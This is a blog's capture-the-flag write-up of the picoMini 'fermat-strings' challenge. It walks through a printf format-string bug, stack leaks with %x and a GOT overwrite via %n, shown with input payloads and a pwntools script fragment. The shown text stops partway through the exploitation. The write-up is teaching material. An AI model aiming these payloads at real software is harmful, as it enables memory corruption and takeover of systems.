<!doctype html><html lang="es"><head><title>fermat-strings | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass"><meta itemprop="description" content="picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass"><meta name="twitter:card" content="picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass"><meta name="twitter:description" content="picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass"><meta property="og:description" content="picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="fermat-strings"><meta property="twitter:title" content="fermat-strings"><meta property="og:title" content="fermat-strings"><meta property="og:url" content="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script>
<script>(async()=>await typeset(()=>[`#math-consts`]))()</script><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/picoctf/binary-exploitation/fermat-strings/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- BINARY EXPLOITATION</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/&text=fermat-strings" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/&title=fermat-strings" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">fermat-strings</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#static-code-analysis">Static code analysis</a></li><li><a href="#format-string-vulnerability">Format String vulnerability</a></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#manual-exploitation">Manual exploitation</a></li><li><a href="#obtaining-memory-leaks">Obtaining memory leaks</a></li><li><a href="#got-overwrite">GOT overwrite</a></li><li><a href="#finding-the-remote-glibc-version">Finding the remote Glibc version</a></li><li><a href="#fixing-the-exploit">Fixing the exploit</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><h2 id="static-code-analysis">Static code analysis</h2><p>We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.</p><p>As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:</p><p>$$
a ^ n + b ^ n = z ^ n
$$</p><p>For $n > 2$.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;string.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;math.h&gt;</span>

<span class="mtk5">#define</span> <span class="mtk8">SIZE</span> <span class="mtk5">0x</span><span class="mtk6">100</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">A[SIZE];</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">B[SIZE];</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

  <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome</span> <span class="mtk4">to</span> <span class="mtk4">Fermat</span><span class="mtk6">\\</span><span class="mtk4">'s</span> <span class="mtk4">Last</span> <span class="mtk4">Theorem</span> <span class="mtk4">as</span> <span class="mtk4">a</span> <span class="mtk4">service"</span><span class="mtk1">);</span>

  <span class="mtk8">setbuf</span><span class="mtk1">(stdout,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
  <span class="mtk8">setbuf</span><span class="mtk1">(stdin,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
  <span class="mtk8">setbuf</span><span class="mtk1">(stderr,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"A:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">SIZE);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"B:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">B,</span> <span class="mtk1">SIZE);</span>

  <span class="mtk1">A[</span><span class="mtk8">strcspn</span><span class="mtk1">(A,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">B[</span><span class="mtk8">strcspn</span><span class="mtk1">(B,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

  <span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(A);</span>
  <span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(B);</span>

  <span class="mtk5">if</span> <span class="mtk1">(a</span> <span class="mtk5">==</span> <span class="mtk6">0</span> <span class="mtk5">||</span> <span class="mtk1">b</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error:</span> <span class="mtk4">could</span> <span class="mtk4">not</span> <span class="mtk4">parse</span> <span class="mtk4">numbers!"</span><span class="mtk1">);</span>
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[SIZE];</span>
  <span class="mtk8">snprintf</span><span class="mtk1">(buffer,</span> <span class="mtk1">SIZE,</span> <span class="mtk4">"Calculating</span> <span class="mtk4">for</span> <span class="mtk4">A:</span> <span class="mtk6">%s</span> <span class="mtk4">and</span> <span class="mtk4">B:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">B);</span>  
  <span class="mtk8">printf</span><span class="mtk1">(buffer);</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">answer</span> <span class="mtk5">=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk1">i</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">i</span> <span class="mtk5">&lt;</span> <span class="mtk6">100</span><span class="mtk1">;</span> <span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">pow</span><span class="mtk1">(a,</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk8">pow</span><span class="mtk1">(b,</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk8">pow</span><span class="mtk1">(i,</span> <span class="mtk6">3</span><span class="mtk1">))</span> <span class="mtk1">{</span>
      <span class="mtk1">answer</span> <span class="mtk5">=</span> <span class="mtk1">i;</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>

  <span class="mtk5">if</span> <span class="mtk1">(answer</span> <span class="mtk5">!=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Found</span> <span class="mtk4">the</span> <span class="mtk4">answer:</span> <span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">answer);</span>
<span class="mtk1">}</span>
</code></pre></div><h2 id="format-string-vulnerability">Format String vulnerability</h2><p>On the source code we can see a Format String vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">snprintf</span><span class="mtk1">(buffer,</span> <span class="mtk1">SIZE,</span> <span class="mtk4">"Calculating</span> <span class="mtk4">for</span> <span class="mtk4">A:</span> <span class="mtk6">%s</span> <span class="mtk4">and</span> <span class="mtk4">B:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">B);</span>  
<span class="mtk8">printf</span><span class="mtk1">(buffer);</span>
</code></pre></div><p>Because we can add format strings into <code>buffer</code> which is the first argument of <code>printf</code>. However, we need to enter a valid number in <code>A</code> and <code>B</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"A:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">SIZE);</span>
<span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"B:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">B,</span> <span class="mtk1">SIZE);</span>

<span class="mtk1">A[</span><span class="mtk8">strcspn</span><span class="mtk1">(A,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>  
<span class="mtk1">B[</span><span class="mtk8">strcspn</span><span class="mtk1">(B,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(A);</span>
<span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(B);</span>
</code></pre></div><p>But this is easy. Let&rsquo;s try:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
B: 1
Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1  
</code></pre></div><p>As we can see, we can dump values from the stack. And also, the value of the format string starts at position 10 (offset 10):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service  
A: 1AAA%10$x
B: 1
Calculating for A: 1AAA41414131 and B: 1
</code></pre></div><h2 id="format-string-exploitation">Format String exploitation</h2><p>The program will exit after we enter our input. We need to find a way of running again the program without stopping the process. This can be done using a the Format String vulnerability, because there is a format <code>%n</code> that allows to write the number of bytes written until <code>%n</code> into the address given as a parameter (the value of a position in the stack).</p><p>We notice that the binary has Partial RELRO, which means that the GOT is not writable during a Buffer Overflow exploitation, but it is writable via Format String. Hence, the idea is to change the value of an function in the GOT to point to <code>main</code> and be able to rerun the program as a result.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">chall</span>
Reading symbols from <span class="code-dark-green">chall</span>...
(No debugging symbols found in <span class="code-dark-green">chall</span>)
<span class="code-red">gef‚û§</span>  break main
Breakpoint 1 at <span class="code-dark-blue">0x40083b</span>
<span class="code-red">gef‚û§</span>  run
Starting program: ./chall

Breakpoint 1, <span class="code-dark-blue">0x000000000040083b</span> in <span class="code-dark-yellow">main</span> ()  
</code></pre></div><p>Now we show the GOT entries:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-yellow">puts@GLIBC_2.2.5  ‚Üí  0x4006c6</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  ‚Üí  0x4006d6</span>  
[0x601028] <span class="code-dark-yellow">setbuf@GLIBC_2.2.5  ‚Üí  0x4006e6</span>
[0x601030] <span class="code-dark-yellow">printf@GLIBC_2.2.5  ‚Üí  0x4006f6</span>
[0x601038] <span class="code-dark-yellow">snprintf@GLIBC_2.2.5  ‚Üí  0x400706</span>
[0x601040] <span class="code-dark-yellow">pow@GLIBC_2.2.5  ‚Üí  0x400716</span>
[0x601048] <span class="code-dark-yellow">strcspn@GLIBC_2.2.5  ‚Üí  0x400726</span>
[0x601050] <span class="code-dark-yellow">read@GLIBC_2.2.5  ‚Üí  0x400736</span>
[0x601058] <span class="code-dark-yellow">atoi@GLIBC_2.2.5  ‚Üí  0x400746</span>
</code></pre></div><p>From the point where we have the <code>printf</code> vulnerability, only <code>pow</code> and <code>printf</code> are called. We are not interested in changing <code>printf</code>, so let&rsquo;s modify the entry for <code>pow</code>.</p><p>First, we are going to put the address in a position of the stack. Let&rsquo;s use the input <code>A</code> for entering the address and the input <code>B</code> to extract it. But before, let&rsquo;s do it with recognizable characters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1234567.AAAABBBB
B: 1.%11$lx
Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141  
</code></pre></div><p>Notice the use of <code>%lx</code> to print an 8-byte value, and the position 11 because in position 10 we have <code>1234567.</code>.</p><p>Now, we can replace <code>AAAABBBB</code> with the address of <code>pow</code> at GOT. And instead of putting <code>%11$lx</code>, we will put <code>%11$n</code>. Let&rsquo;s do it in a Python script with <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> and attach GDB to visualize the GOT entries:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$n'</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">pow</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>  

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
